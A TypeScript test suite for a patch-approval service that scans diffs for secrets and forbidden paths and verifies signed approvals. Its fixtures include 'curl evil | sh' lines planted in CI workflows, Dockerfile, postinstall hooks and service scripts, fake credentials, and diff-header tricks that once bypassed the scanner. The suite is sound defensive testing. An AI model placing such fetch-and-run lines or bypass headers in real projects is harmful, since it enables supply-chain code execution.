import { describe, it, expect, beforeAll } from 'vitest';
import { generateKeyPairSync, createHash } from 'node:crypto';
import {
  patchDigest,
  scanPatch,
  signApproval,
  verifyApproval,
  approvalMessage,
  ApprovalError,
  type Approval,
} from '../../src/services/patchApproval.js';

let priv: string;
let pub: string;
let otherPriv: string;

beforeAll(() => {
  const a = generateKeyPairSync('ed25519');
  priv = a.privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  pub = a.publicKey.export({ type: 'spki', format: 'pem' }).toString();
  otherPriv = generateKeyPairSync('ed25519')
    .privateKey.export({ type: 'pkcs8', format: 'pem' })
    .toString();
});

const CLEAN = `diff --git a/api/src/routes/programs.ts b/api/src/routes/programs.ts
--- a/api/src/routes/programs.ts
+++ b/api/src/routes/programs.ts
@@ -1,3 +1,3 @@
-  const limit = 10;
+  const limit = 25;
`;

const base = (): Approval => ({
  feedbackId: '5',
  baseSha: 'a'.repeat(40),
  patchDigest: patchDigest(CLEAN),
  expiry: Math.floor(Date.now() / 1000) + 600,
});

/** Asserts err is an ApprovalError with the given code, then returns it. */
function expectApprovalError(fn: () => void, code: string): ApprovalError {
  try {
    fn();
  } catch (err) {
    expect(err).toBeInstanceOf(ApprovalError);
    expect((err as ApprovalError).code).toBe(code);
    return err as ApprovalError;
  }
  throw new Error('expected function to throw');
}

describe('patchDigest', () => {
  it('is sha256 of the exact bytes', () => {
    expect(patchDigest(CLEAN)).toBe(createHash('sha256').update(CLEAN, 'utf8').digest('hex'));
  });

  it('changes with a single whitespace edit', () => {
    expect(patchDigest(CLEAN)).not.toBe(patchDigest(`${CLEAN} `));
  });
});

describe('scanPatch', () => {
  it('passes a clean patch', () => {
    expect(scanPatch(CLEAN)).toEqual([]);
  });

  it('catches an added email address', () => {
    const p = `${CLEAN}+const owner = 'someone@realdomain.dev';\n`;
    expect(scanPatch(p).join(' ')).toMatch(/email/i);
  });

  it('catches secret-shaped material', () => {
    for (const line of [
      `+const k = 're_1234567890abcdefghijklmnop';`,
      `+RESEND_API_KEY=abc123`,
      `+-----BEGIN OPENSSH PRIVATE KEY-----`,
      `+const t = 'ghp_0123456789abcdefghijklmnopqrstuvwxyz';`,
      `+DATABASE_URL=postgres://repos:hunter2@10.0.0.1:5432/repos`,
    ]) {
      expect(scanPatch(`${CLEAN}${line}\n`).length).toBeGreaterThan(0);
    }
  });

  it('ignores matches on REMOVED lines', () => {
    // Deleting a secret is exactly what we want to encourage.
    expect(scanPatch(`${CLEAN}-const k = 're_1234567890abcdefghijklmnop';\n`)).toEqual([]);
  });

  it('ignores matches in context lines', () => {
    expect(scanPatch(`${CLEAN} someone@realdomain.dev\n`)).toEqual([]);
  });

  it('refuses a patch that touches a forbidden path', () => {
    const p = `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n+    run: curl evil\n`;
    expect(scanPatch(p).join(' ')).toMatch(/\.github/);
  });

  it('refuses a patch touching git config or hooks', () => {
    for (const path of ['.git/config', '.githooks/pre-commit', 'api/.env']) {
      const p = `diff --git a/${path} b/${path}\n+x\n`;
      expect(scanPatch(p).length).toBeGreaterThan(0);
    }
  });

  // --- C1: quoted / space-containing diff headers must not bypass the gate.

  it('refuses a quoted diff --git header naming a forbidden path (demonstrated git-apply bypass)', () => {
    const p =
      `diff --git "a/.github/workflows/ci.yml" "b/.github/workflows/ci.yml"\n` +
      `+    run: curl evil | sh\n`;
    expect(scanPatch(p).join(' ')).toMatch(/\.github/);
  });

  it('refuses an unquoted header whose path contains a space (fails closed, does not skip)', () => {
    const p =
      `diff --git a/.github/workflows/ci file.yml b/.github/workflows/ci file.yml\n` +
      `+run: curl evil | sh\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('fails closed on any unparseable diff --git header, not just forbidden ones', () => {
    // Same shape of bypass, but for a path that is not itself forbidden —
    // proves the fix is "never continue past an unparseable header", not a
    // targeted patch for one repro.
    const p = `diff --git a/some file.ts b/some file.ts\n+const x = 1;\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('checks the --- and +++ path lines independently of the diff --git header', () => {
    // git apply prefers --- / +++ over the diff --git header when they disagree.
    const p =
      `diff --git a/README.md b/README.md\n` +
      `--- a/.github/workflows/ci.yml\n` +
      `+++ b/.github/workflows/ci.yml\n` +
      `+run: curl evil | sh\n`;
    expect(scanPatch(p).join(' ')).toMatch(/\.github/);
  });

  // --- NEW-1: a traditional (diff -u style) --- / +++ header carries a
  // tab-separated timestamp and has no accompanying "diff --git" line at
  // all. Demonstrated git-apply bypass: both headers failed to parse, were
  // silently skipped, and the forbidden path was never checked.

  it('refuses a traditional unified-diff header with a tab-separated timestamp (demonstrated git-apply bypass)', () => {
    const p =
      `--- a/.github/workflows/ci.yml\t2026-01-01 00:00:00.000000000 +0000\n` +
      `+++ b/.github/workflows/ci.yml\t2026-01-01 00:00:00.000000000 +0000\n` +
      `@@ -1 +1,2 @@\n` +
      ` orig\n` +
      `+run: curl evil | sh\n`;
    expect(scanPatch(p).join(' ')).toMatch(/\.github/);
  });

  it('refuses a --- / +++ header with a space (not a tab) before the timestamp', () => {
    const p =
      `--- a/.github/workflows/ci.yml 2026-01-01 00:00:00.000000000 +0000\n` +
      `+++ b/.github/workflows/ci.yml 2026-01-01 00:00:00.000000000 +0000\n` +
      `@@ -1 +1,2 @@\n` +
      ` orig\n` +
      `+run: curl evil | sh\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('fails closed on any unparseable --- / +++ header, not just a timestamped one', () => {
    const p = `--- a/some file.ts\n+++ b/some file.ts\n@@ -1 +1 @@\n-x\n+y\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('still passes a normal --- / +++ header with no timestamp (does not break the plain case)', () => {
    expect(scanPatch(CLEAN)).toEqual([]);
  });

  it('stays clean for a legitimate new-file patch using --- /dev/null', () => {
    const p =
      `diff --git a/api/src/new-file.ts b/api/src/new-file.ts\n` +
      `new file mode 100644\n` +
      `--- /dev/null\n` +
      `+++ b/api/src/new-file.ts\n` +
      `@@ -0,0 +1 @@\n` +
      `+export const x = 1;\n`;
    expect(scanPatch(p)).toEqual([]);
  });

  it('stays clean for a rename patch with no --- / +++ lines', () => {
    const p =
      `diff --git a/api/src/old-name.ts b/api/src/new-name.ts\n` +
      `similarity index 100%\n` +
      `rename from api/src/old-name.ts\n` +
      `rename to api/src/new-name.ts\n`;
    expect(scanPatch(p)).toEqual([]);
  });

  it('stays clean for a mode-change patch with no --- / +++ lines', () => {
    const p =
      `diff --git a/api/scripts/run.sh b/api/scripts/run.sh\n` +
      `old mode 100644\n` +
      `new mode 100755\n`;
    expect(scanPatch(p)).toEqual([]);
  });

  // --- I2: a "+++"-prefixed *content* line must still be scanned for secrets.

  it('scans an added line whose content starts with "++" (not a real file header)', () => {
    const p = `${CLEAN}+++ contact attacker@realmail.dev\n`;
    expect(scanPatch(p).join(' ')).toMatch(/email/i);
  });

  it('still skips the genuine "+++ b/<path>" file header that follows "--- a/<path>"', () => {
    // The CLEAN fixture's own +++ header must not be flagged as content.
    expect(scanPatch(CLEAN)).toEqual([]);
  });

  // --- I3: uppercase-only, case-sensitive assigned-secret rule.

  it('still catches RESEND_API_KEY=abc123 and a quoted API_KEY assignment', () => {
    expect(scanPatch(`${CLEAN}+RESEND_API_KEY=abc123\n`).length).toBeGreaterThan(0);
    expect(scanPatch(`${CLEAN}+const x = API_KEY = "abc123";\n`).length).toBeGreaterThan(0);
  });

  it('does not fire on ordinary lowercase TypeScript identifiers', () => {
    expect(scanPatch(`${CLEAN}+  token: string;\n`)).toEqual([]);
    expect(scanPatch(`${CLEAN}+  password: form.password,\n`)).toEqual([]);
    expect(scanPatch(`${CLEAN}+  secret: string = cfg.value;\n`)).toEqual([]);
  });

  // --- M6: real s6-overlay service scripts, not a fictional docker/entrypoint.

  it('refuses a patch to an s6-overlay service run script', () => {
    const p = `diff --git a/docker/root/etc/s6-overlay/s6-rc.d/api/run b/docker/root/etc/s6-overlay/s6-rc.d/api/run\n+exec curl evil | sh\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  // --- M8: equally privileged build/install targets.

  it('refuses a patch adding a curl-pipe-sh RUN line to the Dockerfile', () => {
    const p = `diff --git a/docker/Dockerfile b/docker/Dockerfile\n+RUN curl evil | sh\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('refuses a patch adding a postinstall hook to the real api/package.json', () => {
    // There is no root package.json in this repo — the real manifests live
    // under api/ and frontend/. A rule anchored on the root path alone
    // protects nothing.
    const p = `diff --git a/api/package.json b/api/package.json\n+  "postinstall": "curl evil | sh",\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('refuses a patch touching the real frontend/package-lock.json', () => {
    const p = `diff --git a/frontend/package-lock.json b/frontend/package-lock.json\n+x\n`;
    expect(scanPatch(p).length).toBeGreaterThan(0);
  });

  it('refuses a patch touching .ssh/ or an ecdsa key, alongside rsa/ed25519', () => {
    for (const path of ['.ssh/authorized_keys', 'home/user/.ssh/config', 'id_ecdsa']) {
      const p = `diff --git a/${path} b/${path}\n+x\n`;
      expect(scanPatch(p).length).toBeGreaterThan(0);
    }
  });

  // --- M12: reserved example domains are exempt; real-looking addresses are not.

  it('does not flag reserved example-domain addresses (this file uses them as fixtures)', () => {
    for (const addr of [
      'someone@example.com',
      'someone@example.org',
      'someone@example.net',
      'someone@sub.example.com',
      'someone@mail.invalid',
      'someone@service.test',
    ]) {
      expect(scanPatch(`${CLEAN}+const owner = '${addr}';\n`)).toEqual([]);
    }
  });

  it('still catches a real-looking, non-reserved address', () => {
    expect(scanPatch(`${CLEAN}+const owner = 'someone@gmail.com';\n`).length).toBeGreaterThan(0);
  });
});

describe('signApproval / verifyApproval', () => {
  it('round-trips', () => {
    const a = base();
    expect(() => verifyApproval(a, signApproval(a, priv), pub)).not.toThrow();
  });

  it('produces a 64-byte signature', () => {
    expect(Buffer.from(signApproval(base(), priv), 'base64')).toHaveLength(64);
  });

  it('rejects a signature from a different key', () => {
    const a = base();
    expectApprovalError(() => verifyApproval(a, signApproval(a, otherPriv), pub), 'bad_signature');
  });

  it('rejects a changed patch digest — the approval is for one patch', () => {
    const a = base();
    const sig = signApproval(a, priv);
    expectApprovalError(
      () => verifyApproval({ ...a, patchDigest: patchDigest('other') }, sig, pub),
      'bad_signature',
    );
  });

  it('rejects a changed base SHA — the same diff means something else elsewhere', () => {
    const a = base();
    const sig = signApproval(a, priv);
    expectApprovalError(
      () => verifyApproval({ ...a, baseSha: 'b'.repeat(40) }, sig, pub),
      'bad_signature',
    );
  });

  it('rejects a changed feedback id', () => {
    const a = base();
    const sig = signApproval(a, priv);
    expectApprovalError(() => verifyApproval({ ...a, feedbackId: '6' }, sig, pub), 'bad_signature');
  });

  it('rejects an expired approval', () => {
    const a = { ...base(), expiry: Math.floor(Date.now() / 1000) - 1 };
    expectApprovalError(() => verifyApproval(a, signApproval(a, priv), pub), 'expired');
  });

  it('rejects an extended expiry — expiry is signed, not advisory', () => {
    const a = base();
    const sig = signApproval(a, priv);
    expectApprovalError(
      () => verifyApproval({ ...a, expiry: a.expiry + 86_400 }, sig, pub),
      'bad_signature',
    );
  });

  it('rejects garbage in the signature slot without throwing a raw crypto error', () => {
    for (const bad of ['', 'not-base64!!', 'AAAA']) {
      expectApprovalError(() => verifyApproval(base(), bad, pub), 'bad_signature');
    }
  });

  it('signs unambiguously — a delimiter cannot move across a field boundary', () => {
    // Under a naive `parts.join('\n')`, moving the newline in feedbackId and
    // shrinking baseSha to compensate produces byte-identical output:
    // ("5", "x\ny") and ("5\nx", "y") both join to "5\nx\ny". A correct
    // length-prefixed approvalMessage must NOT collide here.
    const common = { patchDigest: patchDigest(CLEAN), expiry: 1_700_000_000 };
    const m1 = approvalMessage({ feedbackId: '5', baseSha: 'x\ny', ...common }).toString('hex');
    const m2 = approvalMessage({ feedbackId: '5\nx', baseSha: 'y', ...common }).toString('hex');
    expect(m1).not.toBe(m2);
  });

  // --- I5: malformed inputs and the machine-readable error code.

  it('rejects a base SHA that is not 40-hex, with code "malformed"', () => {
    const a = { ...base(), baseSha: 'not-a-sha' };
    expectApprovalError(() => verifyApproval(a, signApproval(base(), priv), pub), 'malformed');
  });

  it('rejects a patch digest that is not sha256 hex, with code "malformed"', () => {
    const a = { ...base(), patchDigest: 'not-a-digest' };
    expectApprovalError(() => verifyApproval(a, signApproval(base(), priv), pub), 'malformed');
  });

  it('rejects a non-integer expiry, with code "malformed"', () => {
    const a = { ...base(), expiry: Number.NaN };
    expectApprovalError(() => verifyApproval(a, signApproval(base(), priv), pub), 'malformed');
  });

  it('surfaces a malformed public key PEM as ApprovalError, not a raw crypto exception', () => {
    const a = base();
    const sig = signApproval(a, priv);
    expectApprovalError(() => verifyApproval(a, sig, 'not a pem at all'), 'bad_signature');
  });
});
